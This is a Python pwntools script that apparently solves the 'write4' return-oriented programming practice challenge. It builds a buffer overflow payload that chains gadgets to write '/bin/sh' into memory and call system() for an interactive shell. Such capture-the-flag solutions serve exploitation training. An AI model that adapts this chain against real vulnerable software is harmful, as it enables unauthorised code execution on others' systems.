import struct
from pwn import *

# Setting up the binary
elf = ELF("./write4")
p = elf.process()

# Initialization
inject_str = "/bin/sh\x00"
pop2ret = 0x400890           # pop r14 ; pop r15 ; ret
useful_gadget = 0x400820 
writable = 0x601050
pop_rdi_ret = 0x400893       # pop rdi ; ret
system = 0x4005e0

# Payload

buf = ""
buf += 'A' * 40
buf += struct.pack("<Q", pop2ret)
buf += struct.pack("<Q", writable)
buf += inject_str
buf += struct.pack("<Q", useful_gadget)
buf += struct.pack("<Q", pop_rdi_ret)
buf += struct.pack("<Q", writable)
buf += struct.pack("<Q", system)

#print buf
# Send the payload
p.recvuntil("> ")
p.send(buf+'\n')

p.interactive()
